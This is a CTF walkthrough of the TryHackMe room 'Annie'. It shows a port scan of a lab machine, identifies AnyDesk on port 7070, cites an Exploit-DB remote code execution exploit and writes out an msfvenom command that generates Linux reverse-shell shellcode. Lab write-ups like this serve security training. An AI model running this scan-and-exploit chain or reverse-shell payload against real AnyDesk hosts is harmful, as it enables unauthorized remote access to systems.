https://tryhackme.com/room/annie

  ![image](https://user-images.githubusercontent.com/87700008/205995673-6be11335-a570-4cf0-9b72-a8829cf14cff.png)

Difficulty : Medium

**Initital Recon**:

Started with the quick rustscan, found 3 open ports :

    sudo rustscan -a 10.10.30.155 -- -sC -sV -T4 -vv -oN Annie_nmap
    Open 10.10.30.155:22
    Open 10.10.30.155:7070
    Open 10.10.30.155:33017
![image](https://user-images.githubusercontent.com/87700008/205996318-4065c13e-0675-48ef-85c8-c074b4befe3f.png)
![image](https://user-images.githubusercontent.com/87700008/205996442-54c654cf-20ec-488a-a3ba-215633d23693.png)

At the scan results I observed that there is AnyDesk client running on port **7070**. By looking at this I got some hint that tthis might be the point of initial access.

**Exploitation:**

I quckly searched for google with the AnyDesk 7070 exploit & got the results :
![image](https://user-images.githubusercontent.com/87700008/205997368-4f027e59-6d5b-42d1-841a-2b37990482e7.png)

Since, I don't have any version info I went with the first search result provied by exploit DB for version 5.5.2, ref : https://www.exploit-db.com/exploits/49613

This gave us the python exploit with Remote code execution : 
![image](https://user-images.githubusercontent.com/87700008/205998084-230664ca-cab9-4e28-b917-25c89e30c33b.png)

As per the exploit, we have to create our own shell code with msfvenom, so I created my own:

    msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.y.y LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
    
![image](https://user-images.githubusercontent.com/87700008/205999004-79da675d-5d3f-497d-a37f-943f488e95ff.png)

